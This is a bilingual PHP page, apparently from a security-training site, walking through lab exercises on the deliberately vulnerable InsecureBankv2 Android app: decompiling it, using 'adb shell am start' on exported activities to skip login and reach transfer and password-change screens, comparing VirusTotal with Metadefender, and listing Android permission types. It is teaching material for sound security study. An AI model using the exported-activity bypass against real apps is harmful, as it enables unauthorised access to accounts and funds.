<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Análisis APK InsecureBankv2 — CyberEscudo' : 'InsecureBankv2 APK Analysis — CyberEscudo';
$contentTitle = $lang==='es' ? 'Análisis APK InsecureBankv2' : 'InsecureBankv2 APK Analysis';
$contentDate  = '2022-04-10';
$contentTags  = ['InsecureBankv2','Android','APK','ADB','VirusTotal','Permisos'];
ob_start();
if ($lang==='es'): ?>
<div class="prose">
  <p>Análisis completo de la APK <strong>InsecureBankv2</strong>: desempaquetado, obtención del Manifest, código smali, invocación de actividades exportadas, análisis con herramientas online y permisos de Android.</p>

  <h2>Ejercicio 1 — Desempaquetado y obtención de código</h2>
  <h3>Descompilar con APK Easy Tool</h3>
  <pre><code># 1. Abrir APK Easy Tool
# 2. Browse → seleccionar InsecureBankv2.apk
# 3. Pulsar "Decompile"</code></pre>

  <h3>AndroidManifest.xml en formato legible</h3>
  <p>Tras la descompilación, el Manifest se encuentra en el directorio raíz del proyecto descompilado en formato XML legible con apktool.</p>

  <h3>Código smali</h3>
  <pre><code># Ruta del código smali:
1-Decompiled APKs/InsecureBankv2/smali/com/Android/insecurebankv2/</code></pre>

  <h2>Ejercicio 2 — Invocación de actividades exportadas</h2>
  <p>Las actividades con <code>android:exported="true"</code> pueden iniciarse desde fuera de la app con el Activity Manager (<code>am start</code>):</p>
  <pre><code>adb shell

# Saltarse el login accediendo directamente al panel:
am start -n com.android.insecurebankv2/.PostLogin

# Acceder directamente a transferencias bancarias:
am start -n com.android.insecurebankv2/.DoTransfer

# Acceder directamente al cambio de contraseña:
am start -n com.android.insecurebankv2/.ChangePassword</code></pre>
  <p>Esto demuestra que un atacante puede realizar transferencias o cambiar contraseñas sin autenticarse.</p>

  <h2>Ejercicio 3 — Análisis online: VirusTotal vs Metadefender</h2>
  <table>
    <thead><tr><th>Característica</th><th>VirusTotal</th><th>Metadefender</th></tr></thead>
    <tbody>
      <tr><td>Motores de detección</td><td>Muchos (70+)</td><td>Menos</td></tr>
      <tr><td>Pestaña Detection</td><td>✓ Detallada</td><td>✓ Básica</td></tr>
      <tr><td>Propiedades (MD5, SHA1...)</td><td>✓</td><td>✓</td></tr>
      <tr><td>IPs asociadas / Gráfico</td><td>✓</td><td>✗</td></tr>
      <tr><td>Análisis de comportamiento</td><td>✓</td><td>✗</td></tr>
      <tr><td>Permisos y actividades</td><td>✓</td><td>✓ Metadatos Android</td></tr>
      <tr><td>Comentarios comunidad</td><td>✓</td><td>✗</td></tr>
    </tbody>
  </table>
  <p><strong>Conclusión:</strong> VirusTotal ofrece información mucho más completa que Metadefender.</p>

  <h2>Ejercicio 4 — Tipos de permisos en Android</h2>
  <table>
    <thead><tr><th>Tipo</th><th>Descripción</th><th>Riesgo</th></tr></thead>
    <tbody>
      <tr><td>Normales</td><td>Acceso a datos con bajo impacto en privacidad. Se conceden automáticamente.</td><td>Bajo</td></tr>
      <tr><td>De firma</td><td>Solo se conceden si ambas apps están firmadas con el mismo certificado.</td><td>Bajo</td></tr>
      <tr><td>De tiempo de ejecución (peligrosos)</td><td>Acceso a datos sensibles: cámara, micrófono, ubicación, contactos. Requieren confirmación del usuario.</td><td>Alto</td></tr>
      <tr><td>Especiales</td><td>Definidos por la plataforma: instalar apps desconocidas, dibujar sobre otras apps, acceso a notificaciones.</td><td>Muy alto</td></tr>
      <tr><td>Administrador de dispositivo</td><td>Cambiar contraseña del dispositivo, bloquear el teléfono, borrar todos los datos.</td><td>Crítico</td></tr>
      <tr><td>Root</td><td>Acceso total al sistema sin restricciones.</td><td>Crítico</td></tr>
    </tbody>
  </table>
  <p>Los permisos más críticos a vigilar: <strong>Accesibilidad</strong>, <strong>Notificaciones</strong>, <strong>Administrador de dispositivo</strong> y <strong>Fuentes desconocidas</strong>.</p>
</div>
<?php else: ?>
<div class="prose">
  <p>Full analysis of <strong>InsecureBankv2</strong> APK: unpacking, exported activity invocation, VirusTotal/Metadefender comparison and Android permissions review.</p>

  <h2>Exercise 1 — Decompile with APK Easy Tool</h2>
  <pre><code"># Browse → select InsecureBankv2.apk → Decompile
# Smali path: 1-Decompiled APKs/InsecureBankv2/smali/com/Android/insecurebankv2/</code></pre>

  <h2>Exercise 2 — Invoke Exported Activities</h2>
  <pre><code">adb shell
am start -n com.android.insecurebankv2/.PostLogin       # Bypass login
am start -n com.android.insecurebankv2/.DoTransfer      # Direct transfer
am start -n com.android.insecurebankv2/.ChangePassword  # Change password</code></pre>

  <h2>Exercise 3 — VirusTotal vs Metadefender</h2>
  <table>
    <thead><tr><th>Feature</th><th>VirusTotal</th><th>Metadefender</th></tr></thead>
    <tbody>
      <tr><td>Detection engines</td><td>70+ engines</td><td>Fewer</td></tr>
      <tr><td>Behaviour analysis</td><td>Yes</td><td>No</td></tr>
      <tr><td>IP graph / relations</td><td>Yes</td><td>No</td></tr>
      <tr><td>Community comments</td><td>Yes</td><td>No</td></tr>
    </tbody>
  </table>
  <p><strong>Conclusion:</strong> VirusTotal provides significantly more information.</p>

  <h2>Exercise 4 — Android Permission Types</h2>
  <table>
    <thead><tr><th>Type</th><th>Risk</th></tr></thead>
    <tbody>
      <tr><td>Normal</td><td>Low — granted automatically</td></tr>
      <tr><td>Runtime (Dangerous)</td><td>High — camera, mic, location, contacts</td></tr>
      <tr><td>Special</td><td>Very High — install unknown apps, accessibility</td></tr>
      <tr><td>Device Administrator</td><td>Critical — lock/wipe device</td></tr>
      <tr><td>Root</td><td>Critical — unrestricted system access</td></tr>
    </tbody>
  </table>
</div>
<?php endif;
$contentBody=ob_get_clean();
require __DIR__.'/../templates/content-page.php';
